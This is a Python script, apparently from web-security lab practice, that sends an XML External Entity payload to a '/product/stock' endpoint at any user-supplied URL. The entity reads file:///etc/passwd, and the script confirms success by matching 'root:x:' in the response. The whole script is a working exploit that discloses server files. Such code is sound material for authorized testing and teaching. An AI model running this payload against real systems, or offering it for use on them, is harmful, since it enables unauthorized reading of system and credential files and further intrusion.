import requests

def check_xxe_vulnerability(base_url):
    # Construct the full URL for the stock check endpoint
    stock_check_url = base_url.rstrip('/') + '/product/stock'

    # The XXE payload
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>
    """

    # The headers for the request
    headers = {
        "Content-Type": "application/xml"
    }

    results = []
    try:
        # Send the POST request with the XXE payload
        response = requests.post(stock_check_url, data=xxe_payload, headers=headers)

        # Check if the response contains the contents of /etc/passwd
        if "/bin/bash" in response.text or "root:x:" in response.text:
            results.append("The application is vulnerable to XXE.")
            results.append("Used payload:")
            results.append(xxe_payload)
        else:
            results.append("The application is not vulnerable to XXE or the payload did not succeed.")

    except Exception as e:
        results.append(f"An error occurred: {e}")

    return results

if __name__ == "__main__":
    target_url = input('Enter the base URL to test for xxe vulnerability: ')
    results = check_xxe_vulnerability(target_url)
    for result in results:
        print(result)
